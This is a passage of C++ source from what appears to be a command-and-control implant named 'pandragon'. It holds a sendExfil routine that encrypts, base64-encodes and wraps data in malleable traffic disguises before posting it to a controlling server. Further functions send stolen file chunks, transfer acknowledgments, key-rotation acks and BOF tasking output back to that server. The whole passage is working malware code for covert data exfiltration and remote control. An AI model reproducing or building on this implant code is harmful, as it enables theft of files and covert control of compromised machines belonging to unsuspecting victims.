    if (isTcpTransport()) {
        auto res = getTransport()(g_state.nt, g_state.host, targetPath, g_state.userAgent, g_state.port, content, contentLen);
        bool ok = (res.first != nullptr && res.second > 0);
        if (res.first) __free(res.first);
        return ok;
    }

    // Base64 encode the encrypted content
    char* b64 = b64UrlEncode((const unsigned char*)content, contentLen);
    if (!b64) {
        c_debugPrint(g_state.nt, "[sendExfil] b64UrlEncode failed!");
        return false;
    }

    // Apply SUBMIT malleable wrapper (prefix + suffix) if configured
    char* wrapped = applySubmitMalleableWrapper(b64);
    bool wrapper_applied = (wrapped != nullptr);
    if (!wrapper_applied) {
        wrapped = b64;
    } else {
        __free(b64);
    }

    size_t postBodyLen = __strlen(wrapped);

    // Build target path wchar copy
    size_t pathLen = __wcslen(targetPath);
    wchar_t* wPath = (wchar_t*)__malloc((pathLen + 1) * sizeof(wchar_t));
    if (wPath) {
        for (size_t i = 0; i < pathLen; i++) wPath[i] = targetPath[i];
        wPath[pathLen] = L'\0';
    }

    setRequestDirection(RequestDirection::SUBMIT);
    auto res = getTransport()(g_state.nt, g_state.host, wPath ? wPath : targetPath, g_state.userAgent, g_state.port, wrapped, postBodyLen);
    if (wPath) __free(wPath);
    __free(wrapped);

    bool ok = (res.first != nullptr && res.second > 0);
    if (res.first) __free(res.first);
    return ok;
}

/* ---------------------------------------------------------------------------
 * Send file download acknowledgment (FILE_DOWNLOAD_ACK opcode).
 * --------------------------------------------------------------------------- */
bool pandragon::sendFileDownloadAck(uint32_t fileSize, uint8_t status) {
    if (!g_state.nt) return false;

    payload_file_download_ack payload;
    payload.file_size = fileSize;
    payload.status = status;

    // Generate cryptographically secure random nonce for this packet
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(g_state.nt, nonce)) {
        c_debugPrint(g_state.nt, "[sendFileDownloadAck] CSPRNG failed - aborting packet\n");
        return false;
    }

    // Serialize with encryption
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_state.beacon_id,
        pandragon::b2s_opcode::FILE_DOWNLOAD_ACK,
        getNextSeqNum(),
        nonce,
        reinterpret_cast<const uint8_t*>(&payload),
        sizeof(payload),
        g_state.crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );
    
    if (packet_result.first != pandragon::parse_err::OK) {
        return false;
    }

    bool result = sendExfil(packet_result.second.first, packet_result.second.second, g_state.submit_path);
    __free(packet_result.second.first);

    return result;
}

/* ---------------------------------------------------------------------------
 * Send file chunk data (FILE_CHUNK_DATA opcode).
 * --------------------------------------------------------------------------- */
bool pandragon::sendFileChunkData(uint32_t chunkIndex, uint32_t offset, uint32_t chunkSize, uint8_t status, const uint8_t* data) {
    if (!g_state.nt) return false;
    
    // Build payload: struct + data
    size_t payloadSize = sizeof(payload_file_chunk_data) + (status != 2 ? chunkSize : 0);
    payload_file_chunk_data* payload = (payload_file_chunk_data*)__malloc(payloadSize);
    if (!payload) return false;
    
    payload->chunk_index = chunkIndex;
    payload->offset = offset;
    payload->chunk_size = chunkSize;
    payload->status = status;
    
    // Copy data if not error
    if (status != 2 && data && chunkSize > 0) {
        __memcpy(payload + 1, data, chunkSize);
    }

    // Generate cryptographically secure random nonce for this packet
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(g_state.nt, nonce)) {
        __free(payload);
        return false;
    }

    // Serialize with encryption
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_state.beacon_id,
        pandragon::b2s_opcode::FILE_CHUNK_DATA,
        getNextSeqNum(),
        nonce,
        reinterpret_cast<const uint8_t*>(payload),
        payloadSize,
        g_state.crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );

    __free(payload);

    if (packet_result.first != pandragon::parse_err::OK) {
        return false;
    }

    bool result = sendExfil(packet_result.second.first, packet_result.second.second, g_state.submit_path);
    __free(packet_result.second.first);

    return result;
}

/* ---------------------------------------------------------------------------
 * Send file upload acknowledgment (FILE_UPLOAD_ACK opcode).
 * --------------------------------------------------------------------------- */
bool pandragon::sendFileUploadAck(uint32_t chunkIndex, uint8_t status) {
    if (!g_state.nt) return false;

    payload_file_upload_ack payload;
    payload.chunk_index = chunkIndex;
    payload.status = status;

    // Generate cryptographically secure random nonce for this packet
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(g_state.nt, nonce)) {
        return false;
    }

    // Serialize with encryption
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_state.beacon_id,
        pandragon::b2s_opcode::FILE_UPLOAD_ACK,
        getNextSeqNum(),
        nonce,
        reinterpret_cast<const uint8_t*>(&payload),
        sizeof(payload),
        g_state.crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );
    
    if (packet_result.first != pandragon::parse_err::OK) {
        return false;
    }
    
    bool result = sendExfil(packet_result.second.first, packet_result.second.second, g_state.submit_path);
    __free(packet_result.second.first);

    return result;
}


/* ---------------------------------------------------------------------------
 * Send key rotation acknowledgment (KEY_ROTATE_ACK opcode).
 * --------------------------------------------------------------------------- */
bool pandragon::sendKeyRotateAck(uint8_t status) {
    if (!g_state.nt) return false;

    payload_key_rotate_ack payload;
    payload.status = status;
    payload.reserved[0] = 0;
    payload.reserved[1] = 0;
    payload.reserved[2] = 0;

    // Generate cryptographically secure random nonce for this packet
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(g_state.nt, nonce)) {
        return false;
    }

    // Serialize with encryption
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_state.beacon_id,
        pandragon::b2s_opcode::KEY_ROTATE_ACK,
        getNextSeqNum(),
        nonce,
        reinterpret_cast<const uint8_t*>(&payload),
        sizeof(payload),
        g_state.crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );

    if (packet_result.first != pandragon::parse_err::OK) {
        return false;
    }

    bool result = sendExfil(packet_result.second.first, packet_result.second.second, g_state.submit_path);
    __free(packet_result.second.first);

    return result;
}

/* ---------------------------------------------------------------------------
 * Send BOF output to server (BOF_OUTPUT opcode).
 * --------------------------------------------------------------------------- */
bool pandragon::sendBofOutput(const char* output, size_t len, uint32_t task_id) {
    if (!g_state.nt || !output || len == 0) return false;

    // Allocate buffer for [task_id(4)][output...]
    size_t total_len = len + sizeof(uint32_t);
    uint8_t* payload_buf = (uint8_t*)__malloc(total_len);
    if (!payload_buf) return false;

    // Pack task_id (LE) and data
    payload_buf[0] = (task_id) & 0xFF;
    payload_buf[1] = (task_id >> 8) & 0xFF;
    payload_buf[2] = (task_id >> 16) & 0xFF;
    payload_buf[3] = (task_id >> 24) & 0xFF;
    __memcpy(payload_buf + sizeof(uint32_t), output, len);

    // Generate cryptographically secure random nonce for this packet
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(g_state.nt, nonce)) {
        __free(payload_buf);
        return false;
    }

    // Serialize with encryption
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_state.beacon_id,
        pandragon::b2s_opcode::BOF_OUTPUT,
        getNextSeqNum(),
        nonce,
        payload_buf,
        total_len,
        g_state.crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );

    __free(payload_buf);
    
    if (packet_result.first != pandragon::parse_err::OK) {
        return false;
    }

    bool result = sendExfil(packet_result.second.first, packet_result.second.second, g_state.submit_path);
    __free(packet_result.second.first);

    return result;
}



